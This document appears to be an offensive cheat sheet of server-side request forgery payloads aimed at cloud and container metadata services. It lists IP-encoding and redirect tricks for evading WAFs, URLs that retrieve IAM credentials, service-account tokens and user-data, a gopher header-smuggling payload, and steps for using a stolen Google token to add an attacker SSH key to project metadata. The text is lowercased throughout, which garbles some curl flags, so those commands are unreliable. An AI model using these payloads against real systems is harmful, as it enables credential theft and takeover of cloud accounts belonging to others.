
# ssrf url for cloud instances

> when exploiting server-side request forgery (ssrf) in cloud environments, attackers often target metadata endpoints to retrieve sensitive instance information (e.g., credentials, configurations). below is a categorized list of common urls for various cloud and infrastructure providers

## summary 

* [ssrf url for aws bucket](#ssrf-url-for-aws-bucket)
* [ssrf url for aws ecs](#ssrf-url-for-aws-ecs)
* [ssrf url for aws elastic beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
* [ssrf url for aws lambda](#ssrf-url-for-aws-lambda)
* [ssrf url for google cloud](#ssrf-url-for-google-cloud)
* [ssrf url for digital ocean](#ssrf-url-for-digital-ocean)
* [ssrf url for packetcloud](#ssrf-url-for-packetcloud)
* [ssrf url for azure](#ssrf-url-for-azure)
* [ssrf url for openstack/rackspace](#ssrf-url-for-openstackrackspace)
* [ssrf url for hp helion](#ssrf-url-for-hp-helion)
* [ssrf url for oracle cloud](#ssrf-url-for-oracle-cloud)
* [ssrf url for kubernetes etcd](#ssrf-url-for-kubernetes-etcd)
* [ssrf url for alibaba](#ssrf-url-for-alibaba)
* [ssrf url for hetzner cloud](#ssrf-url-for-hetzner-cloud)
* [ssrf url for docker](#ssrf-url-for-docker)
* [ssrf url for rancher](#ssrf-url-for-rancher)
* [references](#references)


## ssrf url for aws

the aws instance metadata service is a service available within amazon ec2 instances that allows those instances to access metadata about themselves. - [docs](http://docs.aws.amazon.com/awsec2/latest/userguide/ec2-instance-metadata.html#instancedata-data-categories)


* ipv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`
* ipv4 endpoint (new) requires the header `x-aws-ec2-metadata-token`
  ```powershell
  export token=`curl -x put -h "x-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
  curl -h "x-aws-ec2-metadata-token:$token" -v "http://169.254.169.254/latest/meta-data"
  ```

* ipv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/` 

in case of a waf, you might want to try different ways to connect to the api.

* dns record pointing to the aws api ip
  ```powershell
  http://instance-data
  http://169.254.169.254
  http://169.254.169.254.nip.io/
  ```

* http redirect
  ```powershell
  static:http://nicob.net/redir6a
  dynamic:http://nicob.net/redir-http-169.254.169.254:80-
  ```

* encoding the ip to bypass waf
  ```powershell
  http://425.510.425.510 dotted decimal with overflow
  http://2852039166 dotless decimal
  http://7147006462 dotless decimal with overflow
  http://0xa9.0xfe.0xa9.0xfe dotted hexadecimal
  http://0xa9fea9fe dotless hexadecimal
  http://0x41414141a9fea9fe dotless hexadecimal with overflow
  http://0251.0376.0251.0376 dotted octal
  http://0251.00376.000251.0000376 dotted octal with padding
  http://0251.254.169.254 mixed encoding (dotted octal + dotted decimal)
  http://[::ffff:a9fe:a9fe] ipv6 compressed
  http://[0:0:0:0:0:ffff:a9fe:a9fe] ipv6 expanded
  http://[0:0:0:0:0:ffff:169.254.169.254] ipv6/ipv4
  http://[fd00:ec2::254] ipv6
  ```


these urls return a list of iam roles associated with the instance. you can then append the role name to this url to retrieve the security credentials for the role.

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role name]
```

this url is used to access the user data that was specified when launching the instance. user data is often used to pass startup scripts or other configuration information into the instance.

```powershell
http://169.254.169.254/latest/user-data
```

other urls to query to access various pieces of metadata about the instance, like the hostname, public ipv4 address, and other properties.

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[id]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**examples**: 

* jira ssrf leading to aws info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumeruri=http://169.254.169.254/metadata/v1/maintenance`
* *flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`


## ssrf url for aws ecs

if you have an ssrf with file system access on an ecs instance, try extracting `/proc/self/environ` to get uuid.

```powershell
curl http://169.254.170.2/v2/credentials/<uuid>
```

this way you'll extract iam keys of the attached role


## ssrf url for aws elastic beanstalk

we retrieve the `accountid` and `region` from the api.

```powershell
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

we then retrieve the `accesskeyid`, `secretaccesskey`, and `token` from the api.

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[account_id]/`.


## ssrf url for aws lambda

aws lambda provides an http api for custom runtimes to receive invocation events from lambda and send response data back within the lambda execution environment.

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${aws_lambda_runtime_api}/2018-06-01/runtime/invocation/next
```

docs: https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next

## ssrf url for google cloud

:warning: google is shutting down support for usage of the **v1 metadata service** on january 15.

requires the header "metadata-flavor: google" or "x-google-metadata-request: true"

```powershell
http://169.254.169.254/computemetadata/v1/
http://metadata.google.internal/computemetadata/v1/
http://metadata/computemetadata/v1/
http://metadata.google.internal/computemetadata/v1/instance/hostname
http://metadata.google.internal/computemetadata/v1/instance/id
http://metadata.google.internal/computemetadata/v1/project/project-id
```

google allows recursive pulls

```powershell
http://metadata.google.internal/computemetadata/v1/instance/disks/?recursive=true
```

beta does not require a header atm (thanks mathias karlsson @avlidienbrunn)

```powershell
http://metadata.google.internal/computemetadata/v1beta1/
http://metadata.google.internal/computemetadata/v1beta1/?recursive=true
```

required headers can be set using a gopher ssrf with the following technique

```powershell
gopher://metadata.google.internal:80/xget%20/computemetadata/v1/instance/attributes/ssh-keys%20http%2f%31%2e%31%0ahost:%20metadata.google.internal%0aaccept:%20%2a%2f%2a%0ametadata-flavor:%20google%0d%0a
```

interesting files to pull out:

- ssh public key : `http://metadata.google.internal/computemetadata/v1beta1/project/attributes/ssh-keys?alt=json`
- get access token : `http://metadata.google.internal/computemetadata/v1beta1/instance/service-accounts/default/token`
- kubernetes key : `http://metadata.google.internal/computemetadata/v1beta1/instance/attributes/kube-env?alt=json`

### add an ssh key

extract the token

```powershell
http://metadata.google.internal/computemetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

check the scope of the token

```powershell
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.xxxxxkuxxxxxxxkgt0rjsa  

{ 
        "issued_to": "101302079xxxxx", 
        "audience": "10130207xxxxx", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

now push the ssh key.

```powershell
curl -x post "https://www.googleapis.com/compute/v1/projects/1042377752888/setcommoninstancemetadata" 
-h "authorization: bearer ya29.c.emkebq9xi09_1hk1xxxxxxxxt0rjsa" 
-h "content-type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## ssrf url for digital ocean

documentation available at `https://developers.digitalocean.com/documentation/metadata/`

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

all in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

## ssrf url for packetcloud

documentation available at `https://metadata.packet.net/userdata`

## ssrf url for azure

limited, maybe more exists? `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

update apr 2017, azure has more support; requires the header "metadata: true" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipaddress/0/publicipaddress?api-version=2017-04-02&format=text
```

## ssrf url for openstack/rackspace

(header required? unknown)

```powershell
http://169.254.169.254/openstack
```

## ssrf url for hp helion

(header required? unknown)

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

## ssrf url for oracle cloud

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

## ssrf url for alibaba

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## ssrf url for hetzner cloud

```powershell
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
http://169.254.169.254/hetzner/v1/metadata/availability-zone
http://169.254.169.254/hetzner/v1/metadata/region
```

## ssrf url for kubernetes etcd

can contain api keys and internal ip and ports

```powershell
curl -l http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

## ssrf url for docker

```powershell
http://127.0.0.1:2375/v1.24/containers/json

simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

more info:

- daemon socket option: https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option
- docker engine api: https://docs.docker.com/engine/api/latest/

## ssrf url for rancher

```powershell
curl http://rancher-metadata/<version>/<path>
```

more info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/


## references

- [extracting aws metadata via ssrf in google acquisition - tghawkins - december 13, 2017](https://web.archive.org/web/20180210093624/https://hawkinsecurity.com/2017/12/13/extracting-aws-metadata-via-ssrf-in-google-acquisition/)
- [exploiting ssrf in aws elastic beanstalk - sunil yadav - february 1, 2019](https://notsosecure.com/exploiting-ssrf-aws-elastic-beanstalk)
